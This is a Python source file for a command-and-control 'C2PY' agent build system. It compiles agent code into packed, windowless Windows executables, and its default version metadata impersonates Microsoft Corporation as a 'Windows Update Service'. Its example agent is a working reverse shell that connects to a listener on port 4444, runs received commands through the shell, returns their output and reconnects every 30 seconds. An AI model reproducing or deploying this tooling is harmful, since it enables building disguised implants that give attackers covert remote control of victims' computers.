"""
Enhanced Build System for C2PY Agent Compilation
Provides comprehensive EXE generation with advanced features
"""

import os
import sys
import subprocess
import tempfile
import shutil
import json
import zipfile
from pathlib import Path
import threading
import time
import hashlib
import requests

class EnhancedBuildSystem:
    """Enhanced build system with full EXE compilation support"""
    
    def __init__(self, workspace_dir=None):
        self.workspace_dir = workspace_dir or os.getcwd()
        self.build_dir = os.path.join(self.workspace_dir, 'build')
        self.dist_dir = os.path.join(self.workspace_dir, 'dist')
        self.temp_dir = None
        
        # Ensure directories exist
        os.makedirs(self.build_dir, exist_ok=True)
        os.makedirs(self.dist_dir, exist_ok=True)
        
        # Check dependencies
        self.dependencies = self._check_dependencies()
        
    def _check_dependencies(self):
        """Check and report available dependencies"""
        deps = {
            'python': self._check_python(),
            'pyinstaller': self._check_pyinstaller(),
            'upx': self._check_upx(),
            'nuitka': self._check_nuitka(),
            'auto_py_to_exe': self._check_auto_py_to_exe()
        }
        return deps
    
    def _check_python(self):
        """Check Python installation"""
        try:
            result = subprocess.run([sys.executable, '--version'], capture_output=True, text=True)
            return {'available': True, 'version': result.stdout.strip()}
        except:
            return {'available': False, 'version': None}
    
    def _check_pyinstaller(self):
        """Check PyInstaller availability"""
        try:
            result = subprocess.run(['pyinstaller', '--version'], capture_output=True, text=True)
            return {'available': True, 'version': result.stdout.strip()}
        except:
            return {'available': False, 'version': None}
    
    def _check_upx(self):
        """Check UPX availability"""
        try:
            result = subprocess.run(['upx', '--version'], capture_output=True, text=True)
            version = result.stdout.split('\n')[0] if result.stdout else 'Unknown'
            return {'available': True, 'version': version}
        except:
            return {'available': False, 'version': None}
    
    def _check_nuitka(self):
        """Check Nuitka availability"""
        try:
            result = subprocess.run(['nuitka', '--version'], capture_output=True, text=True)
            return {'available': True, 'version': result.stdout.strip()}
        except:
            return {'available': False, 'version': None}
    
    def _check_auto_py_to_exe(self):
        """Check auto-py-to-exe availability"""
        try:
            import auto_py_to_exe
            return {'available': True, 'version': 'Available'}
        except:
            return {'available': False, 'version': None}
    
    def install_dependencies(self, deps_to_install=None):
        """Install required dependencies"""
        if deps_to_install is None:
            deps_to_install = ['pyinstaller', 'nuitka', 'auto-py-to-exe']
        
        results = {}
        for dep in deps_to_install:
            try:
                result = subprocess.run([sys.executable, '-m', 'pip', 'install', dep], 
                                      capture_output=True, text=True)
                results[dep] = {
                    'success': result.returncode == 0,
                    'output': result.stdout,
                    'error': result.stderr
                }
            except Exception as e:
                results[dep] = {
                    'success': False,
                    'output': '',
                    'error': str(e)
                }
        
        # Refresh dependency check
        self.dependencies = self._check_dependencies()
        return results
    
    def download_upx(self, install_dir=None):
        """Download and install UPX compressor"""
        if install_dir is None:
            install_dir = os.path.join(self.workspace_dir, 'tools')
        
        os.makedirs(install_dir, exist_ok=True)
        
        try:
            # UPX download URLs
            upx_urls = {
                'windows': 'https://github.com/upx/upx/releases/download/v4.2.1/upx-4.2.1-win64.zip',
                'linux': 'https://github.com/upx/upx/releases/download/v4.2.1/upx-4.2.1-amd64_linux.tar.xz'
            }
            
            platform = 'windows' if os.name == 'nt' else 'linux'
            url = upx_urls.get(platform)
            
            if not url:
                return {'success': False, 'error': f'No UPX download available for {platform}'}
            
            # Download UPX
            response = requests.get(url, stream=True)
            response.raise_for_status()
            
            # Save to temporary file
            temp_file = os.path.join(install_dir, f'upx.zip')
            with open(temp_file, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            # Extract
            if platform == 'windows':
                with zipfile.ZipFile(temp_file, 'r') as zip_ref:
                    zip_ref.extractall(install_dir)
                
                # Find upx.exe and move to PATH accessible location
                for root, dirs, files in os.walk(install_dir):
                    if 'upx.exe' in files:
                        upx_path = os.path.join(root, 'upx.exe')
                        target_path = os.path.join(install_dir, 'upx.exe')
                        shutil.move(upx_path, target_path)
                        break
            
            # Cleanup
            os.remove(temp_file)
            
            return {
                'success': True,
                'path': os.path.join(install_dir, 'upx.exe' if platform == 'windows' else 'upx'),
                'message': f'UPX installed to {install_dir}'
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def create_build_config(self, agent_code, config):
        """Create comprehensive build configuration"""
        build_config = {
            'agent_code': agent_code,
            'output_name': config.get('output_name', 'agent.exe'),
            'icon_path': config.get('icon_path'),
            'upx_compression': config.get('upx_compression', False),
            'compiler': config.get('compiler', 'pyinstaller'),  # pyinstaller, nuitka, cx_freeze
            'optimization_level': config.get('optimization_level', 'normal'),  # basic, normal, aggressive
            'obfuscation': config.get('obfuscation', False),
            'version_info': config.get('version_info', {}),
            'manifest': config.get('manifest', {}),
            'resources': config.get('resources', []),
            'hidden_imports': config.get('hidden_imports', []),
            'exclude_modules': config.get('exclude_modules', []),
            'additional_options': config.get('additional_options', [])
        }
        return build_config
    
    def build_with_pyinstaller(self, build_config):
        """Build using PyInstaller"""
        if not self.dependencies['pyinstaller']['available']:
            return {'success': False, 'error': 'PyInstaller not available'}
        
        try:
            # Create temporary directory for build
            self.temp_dir = tempfile.mkdtemp()
            
            # Write agent code
            agent_file = os.path.join(self.temp_dir, 'agent.py')
            with open(agent_file, 'w', encoding='utf-8') as f:
                f.write(build_config['agent_code'])
            
            # Create spec file for advanced configuration
            spec_file = os.path.join(self.temp_dir, 'agent.spec')
            spec_content = self._create_pyinstaller_spec(build_config)
            with open(spec_file, 'w', encoding='utf-8') as f:
                f.write(spec_content)
            
            # Create version info if specified
            version_file = None
            if build_config['version_info']:
                version_file = os.path.join(self.temp_dir, 'version_info.txt')
                with open(version_file, 'w', encoding='utf-8') as f:
                    f.write(self._create_version_info(build_config['version_info']))
            
            # Build PyInstaller command
            cmd = [
                'pyinstaller',
                '--onefile',
                '--windowed' if build_config.get('windowed', True) else '--console',
                '--name', build_config['output_name'].replace('.exe', ''),
                '--workpath', os.path.join(self.temp_dir, 'build'),
                '--distpath', self.temp_dir,
                '--specpath', self.temp_dir
            ]
            
            # Add icon
            if build_config['icon_path'] and os.path.exists(build_config['icon_path']):
                cmd.extend(['--icon', build_config['icon_path']])
            
            # Add version info
            if version_file:
                cmd.extend(['--version-file', version_file])
            
            # Add hidden imports
            for imp in build_config.get('hidden_imports', []):
                cmd.extend(['--hidden-import', imp])
            
            # Add excludes
            for exc in build_config.get('exclude_modules', []):
                cmd.extend(['--exclude-module', exc])
            
            # Add additional options
            cmd.extend(build_config.get('additional_options', []))
            
            # Add the Python file
            cmd.append(agent_file)
            
            # Execute build
            result = subprocess.run(cmd, capture_output=True, text=True, cwd=self.temp_dir)
            
            if result.returncode == 0:
                # Find the generated executable
                exe_path = os.path.join(self.temp_dir, build_config['output_name'])
                if os.path.exists(exe_path):
                    # Apply UPX compression if requested
                    if build_config.get('upx_compression', False) and self.dependencies['upx']['available']:
                        self._apply_upx_compression(exe_path)
                    
                    # Move to dist directory
                    final_path = os.path.join(self.dist_dir, build_config['output_name'])
                    shutil.move(exe_path, final_path)
                    
                    return {
                        'success': True,
                        'exe_path': final_path,
                        'size': os.path.getsize(final_path),
                        'build_output': result.stdout,
                        'compiler': 'pyinstaller'
                    }
            
            return {
                'success': False,
                'error': result.stderr,
                'build_output': result.stdout
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            self._cleanup_temp()
    
    def build_with_nuitka(self, build_config):
        """Build using Nuitka for better performance"""
        if not self.dependencies['nuitka']['available']:
            return {'success': False, 'error': 'Nuitka not available'}
        
        try:
            # Create temporary directory
            self.temp_dir = tempfile.mkdtemp()
            
            # Write agent code
            agent_file = os.path.join(self.temp_dir, 'agent.py')
            with open(agent_file, 'w', encoding='utf-8') as f:
                f.write(build_config['agent_code'])
            
            # Build Nuitka command
            cmd = [
                'nuitka',
                '--onefile',
                '--windows-disable-console' if build_config.get('windowed', True) else '',
                '--output-filename=' + build_config['output_name'],
                '--output-dir=' + self.temp_dir
            ]
            
            # Remove empty strings
            cmd = [c for c in cmd if c]
            
            # Add optimization flags
            optimization = build_config.get('optimization_level', 'normal')
            if optimization == 'aggressive':
                cmd.extend([
                    '--lto=yes',
                    '--plugin-enable=anti-bloat',
                    '--prefer-source-code'
                ])
            elif optimization == 'normal':
                cmd.extend(['--lto=no'])
            
            # Add icon
            if build_config['icon_path'] and os.path.exists(build_config['icon_path']):
                cmd.extend(['--windows-icon-from-ico=' + build_config['icon_path']])
            
            # Add the Python file
            cmd.append(agent_file)
            
            # Execute build
            result = subprocess.run(cmd, capture_output=True, text=True, cwd=self.temp_dir)
            
            if result.returncode == 0:
                exe_path = os.path.join(self.temp_dir, build_config['output_name'])
                if os.path.exists(exe_path):
                    # Apply UPX compression if requested
                    if build_config.get('upx_compression', False) and self.dependencies['upx']['available']:
                        self._apply_upx_compression(exe_path)
                    
                    # Move to dist directory
                    final_path = os.path.join(self.dist_dir, build_config['output_name'])
                    shutil.move(exe_path, final_path)
                    
                    return {
                        'success': True,
                        'exe_path': final_path,
                        'size': os.path.getsize(final_path),
                        'build_output': result.stdout,
                        'compiler': 'nuitka'
                    }
            
            return {
                'success': False,
                'error': result.stderr,
                'build_output': result.stdout
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            self._cleanup_temp()
    
    def build_with_multiple_compilers(self, build_config):
        """Build with multiple compilers for comparison"""
        results = {}
        
        # Try PyInstaller first
        if self.dependencies['pyinstaller']['available']:
            config_copy = build_config.copy()
            config_copy['output_name'] = config_copy['output_name'].replace('.exe', '_pyinstaller.exe')
            results['pyinstaller'] = self.build_with_pyinstaller(config_copy)
        
        # Try Nuitka
        if self.dependencies['nuitka']['available']:
            config_copy = build_config.copy()
            config_copy['output_name'] = config_copy['output_name'].replace('.exe', '_nuitka.exe')
            results['nuitka'] = self.build_with_nuitka(config_copy)
        
        return results
    
    def _create_pyinstaller_spec(self, build_config):
        """Create PyInstaller spec file"""
        output_name = build_config['output_name'].replace('.exe', '')
        
        hidden_imports = build_config.get('hidden_imports', [])
        hidden_imports.extend(['socket', 'subprocess', 'threading', 'base64', 'json', 'ssl'])
        
        spec = f'''# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['agent.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports={hidden_imports},
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes={build_config.get('exclude_modules', [])},
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='{output_name}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx={str(build_config.get('upx_compression', False)).lower()},
    upx_exclude=[],
    runtime_tmpdir=None,
    console={str(not build_config.get('windowed', True)).lower()},
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)'''
        return spec
    
    def _create_version_info(self, version_config):
        """Create version info file"""
        file_version = version_config.get('file_version', '1.0.0.0')
        product_version = version_config.get('product_version', '1.0.0.0')
        company_name = version_config.get('company_name', 'Microsoft Corporation')
        file_description = version_config.get('file_description', 'System Update Service')
        product_name = version_config.get('product_name', 'Microsoft Windows')
        copyright_text = version_config.get('copyright', f'© {company_name}. All rights reserved.')
        
        # Parse version numbers
        try:
            fv_parts = [int(x) for x in file_version.split('.')]
            pv_parts = [int(x) for x in product_version.split('.')]
        except:
            fv_parts = [1, 0, 0, 0]
            pv_parts = [1, 0, 0, 0]
        
        # Ensure 4 parts
        while len(fv_parts) < 4:
            fv_parts.append(0)
        while len(pv_parts) < 4:
            pv_parts.append(0)
        
        version_info = f'''# UTF-8
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=({fv_parts[0]}, {fv_parts[1]}, {fv_parts[2]}, {fv_parts[3]}),
    prodvers=({pv_parts[0]}, {pv_parts[1]}, {pv_parts[2]}, {pv_parts[3]}),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
    ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'{company_name}'),
        StringStruct(u'FileDescription', u'{file_description}'),
        StringStruct(u'FileVersion', u'{file_version}'),
        StringStruct(u'InternalName', u'{file_description}'),
        StringStruct(u'LegalCopyright', u'{copyright_text}'),
        StringStruct(u'OriginalFilename', u'{file_description}.exe'),
        StringStruct(u'ProductName', u'{product_name}'),
        StringStruct(u'ProductVersion', u'{product_version}')])
      ]), 
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)'''
        return version_info
    
    def _apply_upx_compression(self, exe_path):
        """Apply UPX compression"""
        try:
            cmd = ['upx', '--best', '--lzma', exe_path]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.returncode == 0
        except:
            return False
    
    def _cleanup_temp(self):
        """Cleanup temporary directory"""
        if self.temp_dir and os.path.exists(self.temp_dir):
            try:
                shutil.rmtree(self.temp_dir)
            except:
                pass
            self.temp_dir = None
    
    def create_installer(self, exe_paths, installer_config):
        """Create installer package"""
        installer_type = installer_config.get('type', 'nsis')  # nsis, inno, zip
        
        if installer_type == 'zip':
            return self._create_zip_installer(exe_paths, installer_config)
        elif installer_type == 'nsis':
            return self._create_nsis_installer(exe_paths, installer_config)
        elif installer_type == 'inno':
            return self._create_inno_installer(exe_paths, installer_config)
        else:
            return {'success': False, 'error': f'Unknown installer type: {installer_type}'}
    
    def _create_zip_installer(self, exe_paths, config):
        """Create ZIP package"""
        try:
            zip_name = config.get('output_name', 'c2py_agents.zip')
            zip_path = os.path.join(self.dist_dir, zip_name)
            
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                for exe_path in exe_paths:
                    if os.path.exists(exe_path):
                        zip_file.write(exe_path, os.path.basename(exe_path))
                
                # Add readme if specified
                if config.get('readme'):
                    readme_path = os.path.join(self.temp_dir or self.dist_dir, 'README.txt')
                    with open(readme_path, 'w') as f:
                        f.write(config['readme'])
                    zip_file.write(readme_path, 'README.txt')
            
            return {
                'success': True,
                'installer_path': zip_path,
                'size': os.path.getsize(zip_path),
                'type': 'zip'
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def generate_build_report(self, build_results):
        """Generate comprehensive build report"""
        report = {
            'timestamp': time.time(),
            'dependencies': self.dependencies,
            'build_results': build_results,
            'system_info': {
                'platform': sys.platform,
                'python_version': sys.version,
                'architecture': os.getenv('PROCESSOR_ARCHITECTURE', 'unknown')
            }
        }
        
        # Save report
        report_path = os.path.join(self.dist_dir, 'build_report.json')
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        return report_path

# Example usage
def example_build():
    """Example build process"""
    build_system = EnhancedBuildSystem()
    
    # Check dependencies
    print("Checking dependencies...")
    deps = build_system.dependencies
    for name, info in deps.items():
        status = "✓" if info['available'] else "✗"
        print(f"{status} {name}: {info.get('version', 'Not available')}")
    
    # Sample agent code
    agent_code = '''
import socket
import subprocess
import os

def main():
    server_ip = "127.0.0.1"
    server_port = 4444
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_ip, server_port))
            
            while True:
                command = s.recv(1024).decode().strip()
                if not command or command.lower() == 'exit':
                    break
                
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except Exception as e:
                    s.send(f"Error: {str(e)}".encode())
            
            s.close()
            
        except Exception as e:
            time.sleep(30)

if __name__ == "__main__":
    main()
'''
    
    # Build configuration
    config = {
        'output_name': 'test_agent.exe',
        'windowed': True,
        'upx_compression': True,
        'optimization_level': 'normal',
        'version_info': {
            'file_version': '1.0.0.0',
            'company_name': 'Microsoft Corporation',
            'file_description': 'Windows Update Service'
        }
    }
    
    # Create build config
    build_config = build_system.create_build_config(agent_code, config)
    
    # Build with multiple compilers
    results = build_system.build_with_multiple_compilers(build_config)
    
    # Generate report
    report_path = build_system.generate_build_report(results)
    print(f"Build report saved to: {report_path}")
    
    return results

if __name__ == "__main__":
    example_build()
